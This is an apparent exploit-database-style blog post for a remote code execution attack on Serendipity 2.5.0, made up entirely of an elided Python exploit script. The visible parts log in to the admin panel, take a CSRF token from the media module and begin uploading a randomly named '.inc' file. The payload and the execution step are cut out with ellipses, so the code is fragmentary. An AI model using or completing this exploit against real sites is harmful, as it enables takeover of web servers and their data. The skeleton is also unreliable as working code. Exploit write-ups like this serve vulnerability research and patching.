---
layout: post
title: Serendipity 2.5.0 - Remote Code Execution (RCE)
date: 2024-04-26
category: exploit
---
...
def generate_filename(extension=".inc"):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + extension
...
def login(base_url, username, password):
    ...
    response = session.post(f"{base_url}/serendipity_admin.php", data=data, headers=headers)
...
def upload_file(session, base_url, filename, token):
    ...
    headers = {
        ...
        "Referer": f"{base_url}/serendipity_admin.php?serendipity[adminModule]=media"
    }
    payload = (
        f"--{boundary}\r\n"
...
def main(base_url, username, password):
    ...
    if session:
        token = get_csrf_token(session.get(f"{base_url}/serendipity_admin.php?serendipity[adminModule]=media"))
